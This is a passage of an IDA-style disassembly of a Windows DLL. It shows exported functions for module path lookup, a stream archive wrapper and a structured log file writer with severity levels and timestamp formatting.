		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B89A
		retn
sub_6AF4B8D5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B918	proc near		; DATA XREF: .rdata:6AF63ED8o
		push	15h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B89A
		retn
sub_6AF4B918	endp

; Exported entry 1188.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1188
Ordinal1188	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	0		; hModule
		call	Ordinal1190
		pop	ecx
		pop	ecx
		retn
Ordinal1188	endp

; Exported entry 1189.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1189(HMODULE hModule, LPSTR lpString1, int)
		public Ordinal1189
Ordinal1189	proc near		; CODE XREF: Ordinal1187+Ap
					; DATA XREF: .rdata:off_6AF66098o

lpString2	= dword	ptr -4
hModule		= dword	ptr  8
lpString1	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		lea	ecx, [ebp+lpString2]
		call	sub_6AF318C3
		lea	eax, [ebp+lpString2]
		push	eax		; int
		push	[ebp+hModule]	; hModule
		call	Ordinal1190
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF4B9A9
		push	offset aCsplitpathGe_0 ; "CSplitPath::GetModuleDirectory() : GetM"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4B9A5:				; CODE XREF: Ordinal1189+3Ej
		xor	esi, esi
		jmp	short loc_6AF4B9C8
; ---------------------------------------------------------------------------

loc_6AF4B9A9:				; CODE XREF: Ordinal1189+1Dj
		mov	edx, [ebp+lpString2]
		mov	eax, [edx-0Ch]
		mov	ecx, [ebp+arg_8]
		inc	eax
		cmp	[ecx], eax
		jnb	short loc_6AF4B9BB
		mov	[ecx], eax
		jmp	short loc_6AF4B9A5
; ---------------------------------------------------------------------------

loc_6AF4B9BB:				; CODE XREF: Ordinal1189+3Aj
		push	edx		; lpString2
		push	[ebp+lpString1]	; lpString1
		call	ds:lstrcpyA
		xor	esi, esi
		inc	esi

loc_6AF4B9C8:				; CODE XREF: Ordinal1189+2Cj
		lea	ecx, [ebp+lpString2]
		call	sub_6AF3789B
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal1189	endp

; Exported entry 1187.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal1187(LPSTR	lpString1, int)
		public Ordinal1187
Ordinal1187	proc near		; CODE XREF: Ordinal228+8p
					; DATA XREF: .rdata:off_6AF66098o

lpString1	= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; int
		push	[esp+4+lpString1] ; lpString1
		push	0		; hModule
		call	Ordinal1189
		add	esp, 0Ch
		retn
Ordinal1187	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B9E8	proc near		; CODE XREF: Ordinal1193+1Ep

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		test	esi, esi
		jnz	short loc_6AF4B9F5
		xor	eax, eax
		jmp	short loc_6AF4BA15
; ---------------------------------------------------------------------------

loc_6AF4B9F5:				; CODE XREF: sub_6AF4B9E8+7j
		push	edi
		mov	edi, [esp+8+arg_4]
		test	edi, edi
		jz	short loc_6AF4BA04
		mov	eax, [edi]
		push	edi
		call	dword ptr [eax+4]

loc_6AF4BA04:				; CODE XREF: sub_6AF4B9E8+14j
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF4BA10
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF4BA10:				; CODE XREF: sub_6AF4B9E8+20j
		mov	[esi], edi
		mov	eax, edi
		pop	edi

loc_6AF4BA15:				; CODE XREF: sub_6AF4B9E8+Bj
		pop	esi
		retn	8
sub_6AF4B9E8	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4BA19	proc near		; CODE XREF: Ordinal1192+11p
		mov	eax, [ecx]
		test	eax, eax
		jz	short locret_6AF4BA25
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

locret_6AF4BA25:			; CODE XREF: sub_6AF4BA19+4j
		retn
sub_6AF4BA19	endp

; Exported entry 1194.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1194
Ordinal1194	proc near		; CODE XREF: Ordinal1192+9p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+18h]
		test	eax, eax
		jz	short locret_6AF4BA37
		and	dword ptr [ecx+18h], 0
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

locret_6AF4BA37:			; CODE XREF: Ordinal1194+5j
		retn
Ordinal1194	endp

; Exported entry 1195.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall Ordinal1195(char Args,	int, int)
		public Ordinal1195
Ordinal1195	proc near		; DATA XREF: .rdata:6AF5F34Co
					; .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx		; Args
		mov	eax, [ecx+18h]
		test	eax, eax
		jnz	short loc_6AF4BA52
		push	offset aCstreamarchive ; "CStreamArchive::ReadEx() : m_piStream	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF4BA86
; ---------------------------------------------------------------------------

loc_6AF4BA52:				; CODE XREF: Ordinal1195+9j
		and	[ebp+var_4], 0
		mov	ecx, [eax]
		push	esi
		mov	esi, [ebp+arg_4]
		lea	edx, [ebp+var_4]
		push	edx
		push	esi
		push	[ebp+arg_0]
		push	eax
		call	dword ptr [ecx+0Ch]
		test	eax, eax
		jl	short loc_6AF4BA76
		cmp	[ebp+var_4], esi
		jnz	short loc_6AF4BA76
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4BA85
; ---------------------------------------------------------------------------

loc_6AF4BA76:				; CODE XREF: Ordinal1195+32j
					; Ordinal1195+37j
		push	eax		; Args
		push	offset aCstreamarchi_0 ; "CStreamArchive::ReadEx() : m_piStream->"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_6AF4BA85:				; CODE XREF: Ordinal1195+3Cj
		pop	esi

locret_6AF4BA86:			; CODE XREF: Ordinal1195+18j
		leave
		retn	8
Ordinal1195	endp

; Exported entry 1196.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall Ordinal1196(char Args,	int, int)
		public Ordinal1196
Ordinal1196	proc near		; DATA XREF: .rdata:6AF5F350o
					; .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx		; Args
		mov	eax, [ecx+18h]
		test	eax, eax
		jnz	short loc_6AF4BAA4
		push	offset aCstreamarchi_1 ; "CStreamArchive::WriteEx() : m_piStream "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF4BAD8
; ---------------------------------------------------------------------------

loc_6AF4BAA4:				; CODE XREF: Ordinal1196+9j
		and	[ebp+var_4], 0
		mov	ecx, [eax]
		push	esi
		mov	esi, [ebp+arg_4]
		lea	edx, [ebp+var_4]
		push	edx
		push	esi
		push	[ebp+arg_0]
		push	eax
		call	dword ptr [ecx+10h]
		test	eax, eax
		jl	short loc_6AF4BAC8
		cmp	[ebp+var_4], esi
		jnz	short loc_6AF4BAC8
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4BAD7
; ---------------------------------------------------------------------------

loc_6AF4BAC8:				; CODE XREF: Ordinal1196+32j
					; Ordinal1196+37j
		push	eax		; Args
		push	offset aCstreamarchi_2 ; "CStreamArchive::WriteEx() : m_piStream-"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_6AF4BAD7:				; CODE XREF: Ordinal1196+3Cj
		pop	esi

locret_6AF4BAD8:			; CODE XREF: Ordinal1196+18j
		leave
		retn	8
Ordinal1196	endp

; Exported entry 1197.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1197
Ordinal1197	proc near		; DATA XREF: .rdata:6AF5F354o
					; .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ecx+18h]
		test	eax, eax
		jnz	short loc_6AF4BAF4
		push	offset aCstreamarchi_3 ; "CStreamArchive::SetPosEx() : m_piStream"...
		call	sub_6AF3102E
		jmp	short loc_6AF4BB33
; ---------------------------------------------------------------------------

loc_6AF4BAF4:				; CODE XREF: Ordinal1197+Aj
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		mov	ecx, [eax]
		lea	edx, [ebp+var_8]
		push	edx
		push	0
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	eax
		call	dword ptr [ecx+14h]
		test	eax, eax
		jl	short loc_6AF4BB27
		mov	ecx, [ebp+var_8]
		cmp	ecx, [ebp+arg_0]
		jnz	short loc_6AF4BB27
		mov	ecx, [ebp+var_4]
		cmp	ecx, [ebp+arg_4]
		jnz	short loc_6AF4BB27
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF4BB36
; ---------------------------------------------------------------------------

loc_6AF4BB27:				; CODE XREF: Ordinal1197+34j
					; Ordinal1197+3Cj ...
		push	eax		; Args
		push	offset aCstreamarchi_4 ; "CStreamArchive::SetPosEx() : m_piStream"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4BB33:				; CODE XREF: Ordinal1197+16j
		pop	ecx
		xor	eax, eax

locret_6AF4BB36:			; CODE XREF: Ordinal1197+49j
		leave
		retn	8
Ordinal1197	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4BB3A	proc near		; CODE XREF: Ordinal1191+15p
		mov	eax, ecx
		and	dword ptr [eax], 0
		retn
sub_6AF4BB3A	endp

; Exported entry 1191.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1191
Ordinal1191	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal311
		lea	ecx, [esi+18h]
		mov	dword ptr [esi], offset	off_6AF5F348
		call	sub_6AF4BB3A
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1191	endp

; Exported entry 1192.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1192
Ordinal1192	proc near		; CODE XREF: sub_6AF4BBA7+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F348
		call	Ordinal1194
		lea	ecx, [esi+18h]
		call	sub_6AF4BA19
		mov	ecx, esi
		pop	esi
		jmp	Ordinal312
Ordinal1192	endp

; Exported entry 1193.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1193
Ordinal1193	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jnz	short loc_6AF4BB94
		push	offset aCstreamarchi_5 ; "CStreamArchive::Reference() :	pStream	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF4BBA4
; ---------------------------------------------------------------------------

loc_6AF4BB94:				; CODE XREF: Ordinal1193+5j
		push	[esp+arg_0]
		add	ecx, 18h
		push	ecx
		call	sub_6AF4B9E8
		xor	eax, eax
		inc	eax

locret_6AF4BBA4:			; CODE XREF: Ordinal1193+14j
		retn	4
Ordinal1193	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4BBA7(void *, char)
sub_6AF4BBA7	proc near		; DATA XREF: .rdata:off_6AF5F348o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1192
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4BBBD
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4BBBD:				; CODE XREF: sub_6AF4BBA7+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4BBA7	endp

; Exported entry 1199.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1199
Ordinal1199	proc near		; CODE XREF: sub_6AF4BBE4+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+74h]
		mov	dword ptr [esi], offset	off_6AF5F388
		call	sub_6AF3789B
		lea	ecx, [esi+70h]
		call	sub_6AF3789B
		mov	ecx, esi
		pop	esi
		jmp	Ordinal383
Ordinal1199	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4BBE4(void *, char)
sub_6AF4BBE4	proc near		; DATA XREF: .rdata:off_6AF5F388o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1199
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4BBFA
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4BBFA:				; CODE XREF: sub_6AF4BBE4+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4BBE4	endp

; Exported entry 1202.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1202(int, int, int, char	*Format, va_list Args)
		public Ordinal1202
Ordinal1202	proc near		; CODE XREF: Ordinal1203+38p
					; Ordinal1204+15p ...

var_6C		= dword	ptr -6Ch
var_68		= dword	ptr -68h
var_64		= byte ptr -64h
SystemTime	= _SYSTEMTIME ptr -44h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= dword	ptr  18h

		mov	eax, offset unknown_libname_109	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 60h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [ebp+var_30]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_34], esi
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		push	offset aCstructuredlog ; "CStructuredLogFile::LogV"
		lea	ecx, [ebp+var_64]
		call	Ordinal751
		lea	ecx, [ebp+var_2C]
		call	sub_6AF318C3
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_2C]
		push	[ebp+Format]	; Format
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31BF4
		mov	eax, [esi]
		lea	ecx, [ebp+var_2C]
		push	ecx		; Args
		mov	ecx, esi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF4BC7F
		push	offset aCstructuredl_0 ; "CStructuredLogFile::LogV() : Filter()	="...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, [ebp+var_2C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF4BC78:				; CODE XREF: Ordinal1202+22Bj
		xor	esi, esi
		jmp	loc_6AF4BE3E
; ---------------------------------------------------------------------------

loc_6AF4BC7F:				; CODE XREF: Ordinal1202+60j
		mov	eax, [ebp+arg_0]
		dec	eax
		jz	short loc_6AF4BCCA
		dec	eax
		jz	short loc_6AF4BCC1
		dec	eax
		jz	short loc_6AF4BCB8
		dec	eax
		jz	short loc_6AF4BCAF
		dec	eax
		jz	short loc_6AF4BCA6
		dec	eax
		jz	short loc_6AF4BC9D
		mov	[ebp+var_28], offset aUnknown ;	"Unknown"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BC9D:				; CODE XREF: Ordinal1202+92j
		mov	[ebp+var_28], offset aDebug ; "Debug"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BCA6:				; CODE XREF: Ordinal1202+8Fj
		mov	[ebp+var_28], offset aAuditfailure ; "AuditFailure"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BCAF:				; CODE XREF: Ordinal1202+8Cj
		mov	[ebp+var_28], offset aAuditsuccess ; "AuditSuccess"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BCB8:				; CODE XREF: Ordinal1202+89j
		mov	[ebp+var_28], offset aError ; "Error"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BCC1:				; CODE XREF: Ordinal1202+86j
		mov	[ebp+var_28], offset aWarning ;	"Warning"
		jmp	short loc_6AF4BCD1
; ---------------------------------------------------------------------------

loc_6AF4BCCA:				; CODE XREF: Ordinal1202+83j
		mov	[ebp+var_28], offset aInformation ; "Information"

loc_6AF4BCD1:				; CODE XREF: Ordinal1202+9Bj
					; Ordinal1202+A4j ...
		lea	ecx, [ebp+Format]
		call	sub_6AF318C3
		lea	ecx, [ebp+Args]
		call	sub_6AF318C3
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		mov	byte ptr [ebp+var_4], 5
		call	ds:GetLocalTime
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax		; Args
		lea	eax, [ebp+Format]
		push	offset a04d02d02d ; "%04d-%02d-%02d"
		push	eax		; int
		call	sub_6AF3217C
		movzx	eax, [ebp+SystemTime.wMilliseconds]
		add	esp, 14h
		push	eax
		movzx	eax, [ebp+SystemTime.wSecond]
		push	eax
		movzx	eax, [ebp+SystemTime.wMinute]
		push	eax
		movzx	eax, [ebp+SystemTime.wHour]
		push	eax		; Args
		lea	eax, [ebp+Args]
		push	offset a02d02d02d03d ; "%02d:%02d:%02d:%03d"
		push	eax		; int
		call	sub_6AF3217C
		mov	ecx, [esi+74h]
		mov	eax, [esi+70h]
		add	esp, 18h
		mov	edi, [ebp+Args]
		push	ecx
		push	[ebp+var_2C]
		mov	ebx, [ebp+Format]
		push	ecx
		push	eax
		push	[ebp+arg_8]
		push	eax
		push	[ebp+arg_4]
		push	eax
		push	edi
		push	eax
		push	ebx
		push	eax
		push	[ebp+var_28]	; Args
		lea	eax, [ebp+var_30]
		push	offset aSSSSSSSSSSSSS ;	"%s%s%s%s%s%s%s%s%s%s%s%s%s\r\n"
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 3Ch
		lea	ecx, [edi-10h]
		call	sub_6AF3160D
		lea	ecx, [ebx-10h]
		call	sub_6AF3160D
		mov	ecx, [ebp+var_2C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		jmp	loc_6AF4BE21
; ---------------------------------------------------------------------------

loc_6AF4BD86:				; DATA XREF: .rdata:6AF63F50o
		push	13h
		lea	ecx, [ebp+var_64]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_64]
		call	Ordinal762
		mov	ecx, [ebp+var_68]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_64]
		call	Ordinal764
		lea	ecx, [ebp+var_64]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4BE1E
		retn
; ---------------------------------------------------------------------------

loc_6AF4BDC9:				; DATA XREF: .rdata:6AF63F60o
		push	15h
		lea	ecx, [ebp+var_64]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_64]
		call	Ordinal762
		mov	eax, [ebp+var_6C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_64]
		call	Ordinal764
		lea	ecx, [ebp+var_64]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4BE1E
		retn
; ---------------------------------------------------------------------------

loc_6AF4BE1E:				; DATA XREF: Ordinal1202+1C3o
					; Ordinal1202+218o
		mov	esi, [ebp+var_34]

loc_6AF4BE21:				; CODE XREF: Ordinal1202+181j
		lea	ecx, [ebp+var_64]
		call	Ordinal753
		test	eax, eax
		jnz	loc_6AF4BC78
		lea	eax, [ebp+var_30]
		push	eax
		mov	ecx, esi
		call	Ordinal407
		mov	esi, eax

loc_6AF4BE3E:				; CODE XREF: Ordinal1202+7Aj
		lea	ecx, [ebp+var_64]
		call	Ordinal752
		mov	ecx, [ebp+var_30]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	14h
Ordinal1202	endp ; sp-analysis failed

; Exported entry 1203.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1203(int, int, int, char	*Format, va_list Args)
		public Ordinal1203
Ordinal1203	proc near		; CODE XREF: Ordinal1205+15p
					; Ordinal1207+15p ...

var_14		= byte ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	eax, ___security_cookie
		push	esi
		push	[ebp+arg_8]
		mov	[ebp+var_4], eax
		lea	eax, [ebp+var_14]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		mov	esi, ecx
		call	ds:wsprintfA
		add	esp, 0Ch
		push	[ebp+Args]	; Args
		lea	eax, [ebp+var_14]
		push	[ebp+Format]	; Format
		mov	ecx, esi
		push	eax		; int
		push	[ebp+arg_4]	; int
		push	[ebp+arg_0]	; int
		call	Ordinal1202
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	14h
Ordinal1203	endp

; Exported entry 1204.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1204(int, int, int, char *Format, char Args)
		public Ordinal1204
Ordinal1204	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	1		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1204	endp

; Exported entry 1205.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1205(int, int, int, char *Format, char Args)
		public Ordinal1205
Ordinal1205	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	1		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1205	endp

; Exported entry 1206.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1206(int, int, int, char *Format, char Args)
		public Ordinal1206
Ordinal1206	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	2		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1206	endp

; Exported entry 1207.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1207(int, int, int, char *Format, char Args)
		public Ordinal1207
Ordinal1207	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	2		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1207	endp

; Exported entry 1208.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1208(int, int, int, char *Format, char Args)
		public Ordinal1208
Ordinal1208	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	3		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1208	endp

; Exported entry 1209.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1209(int, int, int, char *Format, char Args)
		public Ordinal1209
Ordinal1209	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	3		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1209	endp

; Exported entry 1210.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1210(int, int, int, char *Format, char Args)
		public Ordinal1210
Ordinal1210	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	4		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1210	endp

; Exported entry 1211.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1211(int, int, int, char *Format, char Args)
		public Ordinal1211
Ordinal1211	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	4		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1211	endp

; Exported entry 1212.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1212(int, int, int, char *Format, char Args)
		public Ordinal1212
Ordinal1212	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	5		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1212	endp

; Exported entry 1213.

